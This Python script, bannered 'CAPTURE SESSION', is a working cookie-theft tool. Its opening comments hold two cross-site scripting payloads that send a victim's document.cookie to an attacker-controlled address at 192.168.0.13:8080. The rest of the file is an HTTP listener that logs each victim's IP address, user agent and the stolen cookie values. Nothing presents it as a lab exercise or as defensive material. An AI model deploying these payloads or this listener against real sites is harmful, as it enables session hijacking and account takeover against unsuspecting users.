#!/usr/bin/env python3

#    <script>new Image().src="http://192.168.0.13:8080/?"+document.cookie</script> 

#    <script>var i=new Image;i.src="http://192.168.0.13:8080/?"+document.cookie;</script>

print("""


 ██████╗ █████╗ ██████╗ ████████╗██╗   ██╗██████╗ ███████╗    ███████╗███████╗███████╗███████╗██╗ ██████╗ ███╗   ██╗
██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██║   ██║██╔══██╗██╔════╝    ██╔════╝██╔════╝██╔════╝██╔════╝██║██╔═══██╗████╗  ██║
██║     ███████║██████╔╝   ██║   ██║   ██║██████╔╝█████╗      ███████╗█████╗  ███████╗███████╗██║██║   ██║██╔██╗ ██║
██║     ██╔══██║██╔═══╝    ██║   ██║   ██║██╔══██╗██╔══╝      ╚════██║██╔══╝  ╚════██║╚════██║██║██║   ██║██║╚██╗██║
╚██████╗██║  ██║██║        ██║   ╚██████╔╝██║  ██║███████╗    ███████║███████╗███████║███████║██║╚██████╔╝██║ ╚████║
 ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚══════╝╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                                                                                                                    
""")

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from datetime import datetime


class MyHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        query_components = parse_qs(urlparse(self.path).query)
        print("")
        print("{} - {}\t{}".format(
            datetime.now().strftime("%Y-%m-%d %I:%M %p"),
            self.client_address[0],
            self.headers['User-Agent']))
        print("-------------------"*6)
        for k, v in query_components.items():
            print("{}\t\t\t{}".format(k.strip(), v))        

        return

    def log_message(self, format, *args):
        return

if __name__ == "__main__":
    try:
        port = int(input("\ndigite a porte: "))
        server = HTTPServer(('192.168.0.13', port), MyHandler)
        print('\nStarted http server')
        server.serve_forever()
    except KeyboardInterrupt:
        print('^C received, shutting down server')
        server.socket.close()

